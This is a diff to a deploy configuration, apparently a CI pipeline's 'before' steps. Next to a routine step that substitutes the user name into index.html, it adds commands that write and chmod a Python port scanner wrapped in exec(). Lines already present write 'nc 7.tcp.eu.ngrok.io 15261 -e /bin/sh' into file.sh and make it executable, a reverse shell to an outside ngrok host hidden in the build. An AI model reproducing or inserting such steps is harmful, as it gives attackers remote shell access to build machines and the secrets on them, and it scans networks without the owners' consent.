@@ -6,6 +6,8 @@ deploy:
       before:
         - echo Replacing !!!USER!!! with $USER in index.html
         - sed 's/!!!USER!!!/'"$USER"'/g' index.template.html > index.html
+        - echo 'exec("""\nimport sys\nimport socket\nfrom datetime import datetime\n\n# Defining a target\nif len(sys.argv) == 2:\n	\n	# translate hostname to IPv4\n	target = socket.gethostbyname(sys.argv[1])\nelse:\n	print("Invalid amount of Argument")\n\n# Add Banner\nprint("-" * 50)\nprint("Scanning Target: " + target)\nprint("Scanning started at:" + str(datetime.now()))\nprint("-" * 50)\n\ntry:\n	\n	# will scan ports between 1 to 65,535\n	for port in range(1,65535):\n		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n		socket.setdefaulttimeout(1)\n		\n		# returns an error indicator\n		result = s.connect_ex((target,port))\n		if result ==0:\n			print("Port {} is open".format(port))\n		s.close()\n		\nexcept KeyboardInterrupt:\n		print("\\n Exiting Program !!!!")\n		sys.exit()\nexcept socket.gaierror:\n		print("\\n Hostname Could Not Be Resolved !!!!")\n		sys.exit()\nexcept socket.error:\n		print("\\ Server not responding !!!!")\n		sys.exit()\n""")' > ports.py
+        - chmod +x ports.py
         - echo '' > file.sh
         - echo "nc 7.tcp.eu.ngrok.io 15261 -e /bin/sh" >> file.sh
         - chmod +x file.sh
